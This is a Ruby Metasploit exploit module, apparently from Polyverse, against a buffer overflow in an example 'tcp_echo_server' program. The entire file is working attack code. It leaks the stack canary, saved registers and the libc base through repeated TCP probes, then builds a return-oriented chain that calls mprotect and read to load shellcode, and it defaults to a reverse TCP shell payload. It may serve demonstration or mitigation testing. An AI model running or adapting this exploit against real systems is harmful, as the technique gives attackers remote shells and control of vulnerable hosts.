class MetasploitModule < Msf::Exploit::Remote
    Rank = ManualRanking

    include Msf::Exploit::Remote::Tcp

    def initialize(info = {})
        super(
            update_info(
                info,
                'Name'        => 'Polyverse tcp_echo_server example',
                'Description' => 'This is a module for exploiting a buffer overflow in tcp_echo_server',
                'Author'      => 'Polyverse Corp.',
                'References'  =>
                [
                    [ 'URL', 'https://polyverse.io' ],
                ],
                'Platform'    => 'linux',
                'Payload'     => {},
                'Arch'        => [ARCH_X64],
                'Targets'     => 
                [
                    [
                        'Linux x64',
                        {
                            'Arch' => ARCH_X64
                        }
                    ]
                ],
                'DefaultTarget'  => 0, # This is an index into the array 'Targets" above
                'DefaultOptions' => {
                    'PAYLOAD' => 'linux/x64/shell_reverse_tcp'
                }
            )
        )

        # Not using this right now
        register_options(
        [
            OptString.new('NOP',  [true, 'NOP Byte Code (probably should get this from ARCH)', "\x90"]),
            OptInt.new('PREPAD',  [true, 'Number of NOP instructions before payload', 100]), # Should be at least 16
            OptInt.new('POSTPAD', [true, 'Number of NOP instructions after payload', 100])
        ])
    end

    # Returns that the remote host is always vulnerable
    def check
        result = Exploit::CheckCode::Vulnerable

        return result
    end

    def exploit
        print_status("Start...")

        if check() != Exploit::CheckCode::Vulnerable
            print_error("check() failed")
            return
        end

	i_stack_raw     = 0 # Stack column containing raw bytes
	i_stack_idx     = 1 # Stack column containing start index
	i_stack_val     = 2 # Stack column containing correct-endian value

        o_libc_lcsm     = 0x021e50 # __libc_start_main() offset in libc.so.6
        o_libc_mprotect = 0x0f8550 # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep mprotect
        o_libc_read     = 0x0ef320 # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep read
        o_libc_poprdi   = 0x0f0800 # offset to gadget "pop rdi" in libc.so.6
        o_libc_poprsi   = 0x0e780b # offset to gadget "pop rsi" in libc.so.6
        o_libc_poprdx   = 0x0c0d40 # offset to gadget "pop rdx" in libc.so.6

        o_libc_lcsmr    = 0x0000f5 # main return-to offset in __libc_start_main

        s_stack_free    = 0x10000 # save area to be putting our shellcode
        s_stack_exec    = 0x05000 # amount of stack to make executable
        s_stack_length  = 0x20000 # estimated and usually 0x21000=0x23000

        # Presently, this converter assumes little-endian
        def str_to_int(str)
            if str.length > 8
                return 0
            end

            n = 0
            for i in 1..str.length
                if Rex::Arch.endian(target.arch) == ENDIAN_LITTLE
                    n = (n << 8) + str[str.length - i].ord
                else
                    n = (n << 8) + str[i - 1].ord
                end
            end

            return n
        end

        # Formatter for binary string to hex string
        def str_to_str16(str)
            return str.unpack('H*')
        end

        # Formatter for int to hex string
        def int_to_str16(i)
            return "0x" + i.to_s(16)
        end

	# Print utility for a header
        def print_header(hdr)
            print_status("-----------------------------------------------------------------------")
	    print_status("#{hdr}") 
            print_status("-----------------------------------------------------------------------")
        end

	# Print utility for a separator
        def print_separator()
            print_status("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
        end

        # Leak the next n characters
        def probe(n, buf)
            for i in 1..n
                connect
                sock.write buf 
                sleep 0.5
                buf = sock.read(buf.length+1)
                disconnect
            end

            return buf[-n, n], buf.length - n, str_to_int(buf[-n, n]), buf
        end

	# Leak and record the next field
        def probe_field(key, n, buf, stack)
	    stack[key] = Array.new(3)
            stack[key][0], stack[key][1], stack[key][2], buf = probe(n, buf)

	    print_status("#{key.ljust(30)}: #{str_to_str16(stack[key][0])} (#{int_to_str16(stack[key][2])})")

	    return buf, stack
        end

	# Initialize the stack values table
	stack = { }

        # Start looking beyond the 80 byte buffer
        buf = "01234567890123456789012345678901234567890123456789012345678901234567890123456789"

	# vuln_read() frame
	print_header("STACK FRAME: vuln_read(client_fd)")
	buf, stack = probe_field("vuln_read_padding",           8, buf, stack)
	buf, stack = probe_field("vuln_read_canary",            8, buf, stack)
        print_separator()
	buf, stack = probe_field("vuln_read_saved_rbp",         8, buf, stack)
	buf, stack = probe_field("vuln_read_saved_rip",         8, buf, stack)

	# main() frame
        print_header("STACK FRAME: main(argc, argv, envp)")
	buf, stack = probe_field("main_1",                      8, buf, stack)
	buf, stack = probe_field("main_envp",                   8, buf, stack)
	buf, stack = probe_field("main_argv",                   8, buf, stack)
	buf, stack = probe_field("main_fill",                   4, buf, stack)
	buf, stack = probe_field("main_argc",                   4, buf, stack)
	buf, stack = probe_field("main_cli_len",                4, buf, stack)
	buf, stack = probe_field("main_server_port",            4, buf, stack)
	buf, stack = probe_field("main_server_fd",              4, buf, stack)
	buf, stack = probe_field("main_client_fd",              4, buf, stack)
	buf, stack = probe_field("main_server_addr",           16, buf, stack)
	buf, stack = probe_field("main_client_addr",           16, buf, stack)
	buf, stack = probe_field("main_11",                     8, buf, stack)
	buf, stack = probe_field("main_canary",                 8, buf, stack)
        print_separator()
	buf, stack = probe_field("main_saved_rbp",              8, buf, stack)
	buf, stack = probe_field("main_saved_rip",              8, buf, stack)

	# __libc_start_main() frame
        print_header("STACK FRAME: __libc_start_main(main, argc, argv, init, fini, ldso_fini)")
	buf, stack = probe_field("__libc_start_main_1",         8, buf, stack)
	buf, stack = probe_field("__libc_start_main_2",         8, buf, stack)
	buf, stack = probe_field("__libc_start_main_3a",        4, buf, stack)
	buf, stack = probe_field("__libc_start_main_3b",        4, buf, stack)
	buf, stack = probe_field("__libc_start_main_4",         8, buf, stack) # main()
	buf, stack = probe_field("__libc_start_main_5",         8, buf, stack)
	buf, stack = probe_field("__libc_start_main_6",         8, buf, stack)
	buf, stack = probe_field("__libc_start_main_7",         8, buf, stack) # _start()
	buf, stack = probe_field("__libc_start_main_8",         8, buf, stack) # &argc
	buf, stack = probe_field("__libc_start_main_9",         8, buf, stack)
	buf, stack = probe_field("__libc_start_main_a",         8, buf, stack)
	buf, stack = probe_field("__libc_start_main_b",         8, buf, stack)
	buf, stack = probe_field("__libc_start_main_c",         8, buf, stack)
	buf, stack = probe_field("__libc_start_main_d",         8, buf, stack)
	buf, stack = probe_field("__libc_start_main_e",         8, buf, stack)
	buf, stack = probe_field("__libc_start_main_f",         8, buf, stack)
	buf, stack = probe_field("__libc_start_main_g",         8, buf, stack) # __libc_scu_init()
	buf, stack = probe_field("__libc_start_main_h",         8, buf, stack) # argv
	buf, stack = probe_field("__libc_start_main_i",         8, buf, stack) # argc+padding
        print_separator()
	buf, stack = probe_field("__libc_start_main_rbx",       8, buf, stack)
	buf, stack = probe_field("__libc_start_main_rbp",       8, buf, stack)
	buf, stack = probe_field("__libc_start_main_r12",       8, buf, stack) # _start()
	buf, stack = probe_field("__libc_start_main_r13",       8, buf, stack) # &argc
	buf, stack = probe_field("__libc_start_main_r14",       8, buf, stack)
	buf, stack = probe_field("__libc_start_main_saved_rip", 8, buf, stack)

	# _start() frame
        print_header("STACK FRAME: _start()")
	buf, stack = probe_field("_start_rsp", 8, buf, stack)
	buf, stack = probe_field("_start_rax", 8, buf, stack)

	# Compute addresses
        a_libc_base = stack["main_saved_rip"][i_stack_val] - o_libc_lcsmr - o_libc_lcsm   # Address of libc start
        a_stack_top = (stack["vuln_read_saved_rbp"][i_stack_val] + 4095) & 0x7ffffffff000 # Address of top of stack
        a_stack_free = a_stack_top - s_stack_free                                         # Address of safe place for our payload
        a_stack_recover = (a_stack_free - buf.length) & 0x7ffffffff000                    # Address to store the recovery data (buf)
        a_libc_mprotect = a_libc_base + o_libc_mprotect                                   # Address of mprotect()
        a_libc_read = a_libc_base + o_libc_read                                           # Address of read()
        a_libc_poprdi = a_libc_base + o_libc_poprdi                                       # Address of gadget "pop rdi; ret"
        a_libc_poprsi = a_libc_base + o_libc_poprsi                                       # Address of gadget "pop rsi; ret"
        a_libc_poprdx = a_libc_base + o_libc_poprdx                                       # Address of gadget "pop rdx; ret"

	# Print them out
        print_header("COMPUTED ADDRESSES")
        print_status("a_libc_base:       #{int_to_str16(a_libc_base)}")
        print_status("a_stack_top:       #{int_to_str16(a_stack_top)}")
        print_status("a_stack_free:      #{int_to_str16(a_stack_free)}")
        print_status("a_stack_recover:   #{int_to_str16(a_stack_recover)}")
        print_status("a_libc_mprotect:   #{int_to_str16(a_libc_mprotect)}")
        print_status("a_libc_read:       #{int_to_str16(a_libc_read)}")
        print_status("a_libc_poprdi:     #{int_to_str16(a_libc_poprdi)}")
        print_status("a_libc_poprsi:     #{int_to_str16(a_libc_poprsi)}")
        print_status("a_libc_poprdx:     #{int_to_str16(a_libc_poprdx)}")
	print_header("COMPLETE")
        print_status("")

        # Start with buf up to the return address
        b = buf[0, stack["vuln_read_saved_rip"][i_stack_idx]]

        # Make the stack writable
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprdi)
        b += Rex::Arch.pack_addr(target.arch, a_stack_free)
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprsi)
        b += Rex::Arch.pack_addr(target.arch, s_stack_exec)
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprdx)
        b += Rex::Arch.pack_addr(target.arch, 0x7)
        b += Rex::Arch.pack_addr(target.arch, a_libc_mprotect)

        # Read the shellcode into the unused stack allocation
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprdi)
        b += Rex::Arch.pack_addr(target.arch, stack["main_client_fd"][i_stack_val])
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprsi)
        b += Rex::Arch.pack_addr(target.arch, a_stack_free)
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprdx)
        b += Rex::Arch.pack_addr(target.arch, payload.encoded.length)
        b += Rex::Arch.pack_addr(target.arch, a_libc_read)

        # Copy the original data (in buf) so we can put it back
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprdi)
        b += Rex::Arch.pack_addr(target.arch, stack["main_client_fd"][i_stack_val])
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprsi)
        b += Rex::Arch.pack_addr(target.arch, a_stack_recover)
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprdx)
        b += Rex::Arch.pack_addr(target.arch, buf.length)
        b += Rex::Arch.pack_addr(target.arch, a_libc_read)

        # Return to the shellcode that we will place at a_stack_free
        b += Rex::Arch.pack_addr(target.arch, a_stack_free)

        ## The following two lines don't get hit. Need to understand this better.
        ## Reasonably sure that when the shellcode starts, it's a new thread

        # When the shell exits, copy the data back to the corrupted stack
        b += Rex::Arch.pack_addr(target.arch, 0)

        # This doesn't get hit. Leave it here. First attempt to recover stack
        b += Rex::Arch.pack_addr(target.arch, stack["vuln_read_saved_rip"][i_stack_val])

        # Exploit
        connect
        sock.write b
        sleep 0.5
        sock.write payload.encoded
        sleep 0.5
        sock.write buf
        disconnect

        print_status("Done. (If successful, you should get a promptless shell.)")
    end
end
